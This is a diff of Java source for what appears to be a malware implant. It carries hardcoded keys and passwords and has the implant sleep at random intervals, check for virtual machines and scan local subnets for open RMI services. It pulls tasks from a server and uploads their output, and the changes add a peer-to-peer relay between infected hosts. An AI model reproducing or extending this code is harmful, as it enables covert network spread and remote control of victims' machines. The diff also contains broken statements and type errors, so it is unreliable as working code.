@@ -39,6 +39,7 @@ import java.rmi.Naming;
 import java.rmi.Remote;
 import java.rmi.RemoteException;
 import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
 import java.rmi.server.UnicastRemoteObject;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
@@ -82,12 +83,10 @@ class nConfig
     public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static int metastasize = 0;
     public static String server = "127.0.0.1";
+    public static int isDownstream = 0;
+    public static String upstreamSvc = "0000NocRemRegImplEx";
     public static String upstreamHost = "";
     public static int upstreamPort = 35506;
-    public static int springReachable = 1;
-    public static int isKeystone = 0;
-    public static int stutterMin = 10;
-    public static int stutterMax = 50;
     public static int virtThreshold = 10; //6 for when it's ready
     public static String passMat = "T__+Pmv.REW=u9iXBB-";
     public static Hashtable endpoints = new Hashtable(){
@@ -113,6 +112,7 @@ public class Main
     static private pkgLib packager = new pkgLib();
     static private nConfig config = new nConfig();
     static public network nComm = new network();
+    static public P2PInterface ifaceP2P = null;
 
     public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
@@ -134,6 +134,19 @@ public class Main
         //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
         nComm.findP2P();
 
+        if (p2pList.size() > 0)
+        {
+            config.isDownstream = 1;
+        }
+
+        Thread t = new Thread(new Runnable() {
+            public void run() {
+                P2PServer srvObj = new P2PServer();
+                srvObj.rmiServer();
+            }
+        });
+        t.start();
+
         keepalive();
     }
 
@@ -144,50 +157,73 @@ public class Main
         utilitarian nUtil = new utilitarian();
 
         int c;
-
-        //rewrite
-        // 1. scan for p2p
-        // 2. if p2p available, use it
-        // 3. if p2p is not available, try connecting via https
-        // 4. if downstream > 3, try reaching out via https
-        // 5. if impossible to reach https endpoint
-
-
-
         for (c=0; c<4; c++)
         {
 
             try
             {  
-                if (p2pList.size() > 0)
+                if (config.isDownstream == 1 && c<p2pList.size()-1)
                 {
-                    String cReq 
-                }
-                else
-                {
-                    String cReq = nComm.request(nComm.mkAuth(),"auth");
-                }
+                    //we have a problem. Theoretically this network configuration will eventually eat itself
+            
+                    //every agent wants to talk to other agents, and will attempt to do so if possible
 
-                if (cReq != "null")
-                {
-                    Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  
+                    //
 
-                    nonce = xmlResponse.get("nonce").toString();
-                    cookieData = xmlResponse.get("cookie").toString();
-                    config.encKey = xmlResponse.get("key").toString();
+                    //add logic on tasking to allow for multiple upstreams
+                    config.upstreamHost = p2pList.get(c);
+                    P2PInterface ifaceP2P = nComm.initP2PInterface();
 
-                    ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
+                    String passwdEncoded = new String(
+                        Base64.getEncoder().encode(
+                            secInst.encrypt(
+                                config.passMat.getBytes(),
+                                config.defaultKey.getBytes(), 
+                                downstreamNonce.getBytes()
+                            )
+                        )
+                    );
 
-                    for (int k=0; k<taskSet.size(); k++)
-                    {
-                        tasks.add(taskSet.get(k));
-                    }
+                    Hashtable authData = ifaceP2P.auth(sessUUID,passwdEncoded,nUtil.strand(12));
+
+                    cookieData = authData.get("cookie");
+                    tasks = (ArrayList) authData.get("tasks");
+
+                    config.encKey = new String(
+                        Base64.getDecoder().encode(
+                            secInst.decrypt(
+                                cookieEncrypted.getBytes(),
+                                config.defaultKey.getBytes(), 
+                                downstreamNonce.getBytes()
+                            )
+                        )
+                    );
                     break;
                 }
                 else
                 {
-                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
-                    continue;
+                    String cReq = nComm.request(nComm.mkAuth(),"auth");
+                    if (cReq != "null")
+                    {
+                        Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  
+    
+                        nonce = xmlResponse.get("nonce").toString();
+                        cookieData = xmlResponse.get("cookie").toString();
+                        config.encKey = xmlResponse.get("key").toString();
+    
+                        ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
+    
+                        for (int k=0; k<taskSet.size(); k++)
+                        {
+                            tasks.add(taskSet.get(k));
+                        }
+                        break;
+                    }
+                    else
+                    {
+                        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
+                        continue;
+                    }
                 }
             }
             catch (Exception e)
@@ -278,7 +314,6 @@ public class Main
 
     public static void threader(Class classData, Method methodData, String[] args)
     {
-        utilitarian nUtil = new utilitarian();
         Runnable rObj = new runnableThread(classData,methodData,args);
 
         Thread threadedTask = new Thread(rObj);
@@ -289,13 +324,19 @@ public class Main
     {
         if (output.size() > 0)
         {
-            System.out.println("output available");
             for (int d=0;d<output.size();d++)
             {
                 try {
                     TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,7))*1000);
                     Document outData = (Document) output.get(d);
-                    String cReq = nComm.request(nUtil.xmlDocToString(outData),"upload");
+                    if (isDownstream == 1) 
+                    {
+                        ifaceP2P.put(sessUUID,cookieData,nUtil.strand(12),output);
+                    }
+                    else
+                    {
+                        String cReq = nComm.request(nUtil.xmlDocToString(outData),"upload");
+                    }
                 }
                 catch (Exception e)
                 {
@@ -308,7 +349,6 @@ public class Main
         keepalive();
     }
 
-    //need class getter
 
     public static class runnableThread implements Runnable
     {
@@ -529,19 +569,14 @@ public class Main
 
             P2PInterface srvObj = new P2PSrvImpl();
 
-            Naming.bind("0000RemRegImplEx", (Remote) srvObj);
+            Naming.bind(config.upstreamSvc, (Remote) srvObj);
         }
     }
 
     public interface P2PInterface extends Remote
     {
         //creates cookie session object and adds uuid to downstream agents
-        public String auth(String uuid, String passwd) throws RemoteException;
-        //hands off upstream key (should replicate across all downstream agents) to replace default
-        public String kex(String uuid, String cookie, String nonce) throws RemoteException;
-        //retrieve task data
-        public ArrayList get(String uuid, String cookie, String nonce) throws RemoteException;
-        //send output
+        public Hashtable auth(String uuid, String passwd) throws RemoteException;
         public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException;
         //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
         public String disconnect(String uuid, String cookie, String nonce) throws RemoteException;
@@ -555,75 +590,30 @@ public class Main
         }
 
         @Override
-        public String auth(String uuid, String passwd) throws RemoteException
+        public Hashtable auth(String uuid, String passwd, String downstreamNonce) throws RemoteException
         {
-            String tempNonce = uuid.substring(0,12).replace("-","");
+            String currentKey;
+            if (downstreamAgents.containsKey(uuid))
+            {
+                currentKey = config.encKey;
+            }
+            else
+            {
+                currentKey = config.defaultKey;
+            }
+
             String authBlob = new String(
                 Base64.getDecoder().decode(
                     secInst.decrypt(
                         passwd.getBytes(),
-                        config.defaultKey.getBytes(),
-                        tempNonce.getBytes()
+                        currentKey.getBytes(),
+                        downstreamNonce.getBytes()
                     )
                 )
             );
             if (authBlob.equals(config.passMat))
             {
-                String cookieData = mkCookie(uuid,config.passMat);
-                downstreamAgents.put(uuid,cookieData);
-                return cookieData;
-            }
-            else
-            {
-                return "error";
-            }
-        }
-
-        @Override
-        public String kex(String uuid, String cookie, String downstreamNonce) throws RemoteException
-        {
-            String authBlob = new String(
-                Base64.getDecoder().decode(
-                    secInst.decrypt(
-                        cookie.getBytes(),
-                        config.defaultKey.getBytes(),
-                        downstreamNonce.getBytes()
-                    )
-                )
-            );
-            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
-            {
-                String kexBlob = new String(
-                    Base64.getEncoder().encode(
-                        secInst.encrypt(
-                            config.encKey.getBytes(),
-                            config.defaultKey.getBytes(), 
-                            downstreamNonce.getBytes()
-                        )
-                    )
-                );
-                return kexBlob;
-            }
-            else
-            {
-                return "error";
-            }
-        }
-
-        @Override
-        public ArrayList get(String uuid, String cookie, String downstreamNonce) throws RemoteException
-        {
-            String authBlob = new String(
-                Base64.getDecoder().decode(
-                    secInst.decrypt(
-                        cookie.getBytes(),
-                        config.encKey.getBytes(),
-                        downstreamNonce.getBytes()
-                    )
-                )
-            );
-            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
-            {
+                Hashtable authData = new Hashtable();
                 ArrayList taskData = new ArrayList();
                 for (int t=0;t<tasks.size();t++)
                 {
@@ -638,11 +628,28 @@ public class Main
                     }
                 }
 
-                return taskData;
+                String kexBlob = new String(
+                    Base64.getEncoder().encode(
+                        secInst.encrypt(
+                            config.encKey.getBytes(),
+                            currentKey.getBytes(), 
+                            downstreamNonce.getBytes()
+                        )
+                    )
+                );
+
+                String rmiCookie = mkCookie(uuid,config.passMat);
+                downstreamAgents.put(uuid,cookieData);
+
+                authData.put("tasks", taskData);
+                authData.put("key", kexBlob);
+                authData.put("cookie", rmiCookie);
+
+                return authData;
             }
             else
             {
-                return "error";
+                return "null";
             }
         }
 
@@ -668,7 +675,7 @@ public class Main
             }
             else
             {
-                return "error";
+                return "null";
             }
         }
 
@@ -691,7 +698,7 @@ public class Main
             }
             else
             {
-                return "error";
+                return "null";
             }
         }
 
@@ -714,13 +721,31 @@ public class Main
         }
     }
 
-    public class P2PClient
-    {
-        
-    }
 
     class network
     {
+        public ArrayList initP2PInterface()
+        {
+            ArrayList retrList = new ArrayList();
+            try
+            {
+                P2PInterface regRemote = (P2PInterface) Naming.lookup(String.format(
+                    "rmi://%s:%s/%s",
+                    config.upstreamHost,
+                    config.upstreamPort,
+                    config.upstreamSvc
+                    )
+                );
+
+                retrList.add("null",regRemote);
+            }
+            catch (Exception e)
+            {
+                retrList.add(e.getMessage());
+            }
+            return retrList;
+        }
+
         public ArrayList findOpenRMI(ArrayList addresses)
         {
             ArrayList localNodes = new ArrayList();
@@ -749,7 +774,10 @@ public class Main
                 String[] prefix = ipAddresses.get(a).split(".");
                 for (int o=1; o<255; o++)
                 {
-                    subnetAddrs.add(String.join(".",prefix[0],prefix[1],prefix[2],String.valueof(o)));
+                    if (o != Integer.valueOf(prefix[3]))
+                    {
+                        subnetAddrs.add(String.join(".",prefix[0],prefix[1],prefix[2],String.valueof(o)));
+                    }
                 }
             }
             return subnetAddrs;
